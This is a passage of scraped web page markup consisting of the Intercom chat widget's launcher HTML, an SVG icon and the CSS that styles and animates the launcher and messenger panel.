1px !important; top: 0 !important; left: 0 !important; border: none !important; display: block !important; z-index: -1 !important; pointer-events: none;" aria-hidden="true" tabindex="-1" title="Intercom"></iframe><div class="intercom-lightweight-app"><div class="intercom-lightweight-app-launcher intercom-launcher" role="button" tabindex="0" aria-label="Open Intercom Messenger" aria-live="polite"><div class="intercom-lightweight-app-launcher-icon intercom-lightweight-app-launcher-icon-open"><img src="https://downloads.intercomcdn.com/i/o/369812/618f59eb6f3b1f6de8e11a97/efef1192e4fa386f159825fbf792ed52.png" alt="" class="intercom-lightweight-app-launcher-custom-icon-open"></div><div class="intercom-lightweight-app-launcher-icon intercom-lightweight-app-launcher-icon-minimize"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
  <path fill-rule="evenodd" clip-rule="evenodd" d="M18.601 8.39897C18.269 8.06702 17.7309 8.06702 17.3989 8.39897L12 13.7979L6.60099 8.39897C6.26904 8.06702 5.73086 8.06702 5.39891 8.39897C5.06696 8.73091 5.06696 9.2691 5.39891 9.60105L11.3989 15.601C11.7309 15.933 12.269 15.933 12.601 15.601L18.601 9.60105C18.9329 9.2691 18.9329 8.73091 18.601 8.39897Z" fill="white"></path>
</svg>
</div></div><style id="intercom-lightweight-app-style" type="text/css">
  @keyframes intercom-lightweight-app-launcher {
    from {
      opacity: 0;
      transform: scale(0.5);
    }
    to {
      opacity: 1;
      transform: scale(1);
    }
  }

  @keyframes intercom-lightweight-app-gradient {
    from {
      opacity: 0;
    }
    to {
      opacity: 1;
    }
  }

  @keyframes intercom-lightweight-app-messenger {
    0% {
      opacity: 0;
      transform: scale(0);
    }
    40% {
      opacity: 1;
    }
    100% {
      transform: scale(1);
    }
  }

  .intercom-lightweight-app {
    position: fixed;
    z-index: 2147483001;
    width: 0;
    height: 0;
    font-family: intercom-font, "Helvetica Neue", "Apple Color Emoji", Helvetica, Arial, sans-serif;
  }

  .intercom-lightweight-app-gradient {
    position: fixed;
    z-index: 2147483002;
    width: 500px;
    height: 500px;
    bottom: 0;
    right: 0;
    pointer-events: none;
    background: radial-gradient(
      ellipse at bottom right,
      rgba(29, 39, 54, 0.16) 0%,
      rgba(29, 39, 54, 0) 72%);
    animation: intercom-lightweight-app-gradient 200ms ease-out;
  }

  .intercom-lightweight-app-launcher {
    position: fixed;
    z-index: 2147483003;
    padding: 0 !important;
    margin: 0 !important;
    border: none;
    bottom: 20px;
    right: 20px;
    max-width: 48px;
    width: 48px;
    max-height: 48px;
    height: 48px;
    border-radius: 50%;
    background: #85C700;
    cursor: pointer;
    box-shadow: 0 1px 6px 0 rgba(0, 0, 0, 0.06), 0 2px 32px 0 rgba(0, 0, 0, 0.16);
    transition: transform 167ms cubic-bezier(0.33, 0.00, 0.00, 1.00);
    box-sizing: content-box;
  }


  .intercom-lightweight-app-launcher:hover {
    transition: transform 250ms cubic-bezier(0.33, 0.00, 0.00, 1.00);
    transform: scale(1.1)
  }

  .intercom-lightweight-app-launcher:active {
    transform: scale(0.85);
    transition: transform 134ms cubic-bezier(0.45, 0, 0.2, 1);
  }


  .intercom-lightweight-app-launcher:focus {
    outline: none;

    
  }

  .intercom-lightweight-app-launcher-icon {
    display: flex;
    align-items: center;
    justify-content: center;
    position: absolute;
    top: 0;
    left: 0;
    width: 48px;
    height: 48px;
    transition: transform 100ms linear, opacity 80ms linear;
  }

  .intercom-lightweight-app-launcher-icon-open {
    
        opacity: 1;
        transform: rotate(0deg) scale(1);
      
  }

  .intercom-lightweight-app-launcher-icon-open svg {
    width: 24px;
    height: 24px;
  }

  .intercom-lightweight-app-launcher-icon-open svg path {
    fill: rgb(255, 255, 255);
  }

  .intercom-lightweight-app-launcher-icon-self-serve {
    
        opacity: 1;
        transform: rotate(0deg) scale(1);
      
  }

  .intercom-lightweight-app-launcher-icon-self-serve svg {
    height: 44px;
  }

  .intercom-lightweight-app-launcher-icon-self-serve svg path {
    fill: rgb(255, 255, 255);
  }

  .intercom-lightweight-app-launcher-custom-icon-open {
    max-height: 24px;
    max-width: 24px;

    
        opacity: 1;
        transform: rotate(0deg) scale(1);
      
  }

  .intercom-lightweight-app-launcher-icon-minimize {
    
        opacity: 0;
        transform: rotate(-60deg) scale(0);
      
  }

  .intercom-lightweight-app-launcher-icon-minimize svg path {
    fill: rgb(255, 255, 255);
  }

  .intercom-lightweight-app-messenger {
    position: fixed;
    z-index: 2147483003;
    overflow: hidden;
    background-color: white;
    animation: intercom-lightweight-app-messenger 250ms cubic-bezier(0, 1, 1, 1);
    transform-origin: bottom right;

    
        width: 400px;
        height: calc(100% - 104px);
        max-height: 704px;
        min-height: 250px;
        right: 20px;
        bottom: 84px;
        box-shadow: 0 5px 40px rgba(0,0,0,0.16);
      

    border-radius: 16px;
  }

  .intercom-lightweight-app-messenger-header {
    height: 64px;
    border-bottom: none;
    background: white
  }

  .intercom-lightweight-app-messenger-footer{
    position:absolute;
    bottom:0;
    width: 100%;
    height: 80px;
    background: #fff;
    font-size: 14px;
    line-height: 21px;
    border-top: 1px solid rgba(0, 0, 0, 0.05);
    box-shadow: 0px 0px 25px rgba(0, 0, 0, 0.05);
  }

  @media print {
    .intercom-lightweight-app {
      display: none;
    }
  }
</style></div><div id="intercom-tooltips-container" class="intercom-namespace"><style>html.intercom-mobile-messenger-active,html.intercom-mobile-messenger-active>body,html.intercom-modal-open,#intercom-container-body{overflow:hidden!important;}html.intercom-mobile-messenger-active,html.intercom-mobile-messenger-active>body{position:static!important;transform:none!important;}html.intercom-mobile-messenger-active>body{height:0!important;margin:0!important;}iframe#intercom-frame{position:absolute!important;opacity:0!important;width:1px!important;height:1px!important;top:0!important;left:0!important;border:none!important;display:block!important;z-index:-1!important;;};;</style></div><div id="intercom-css-container"><style data-emotion="intercom-with-namespace-global" data-s=""></style></div></body>
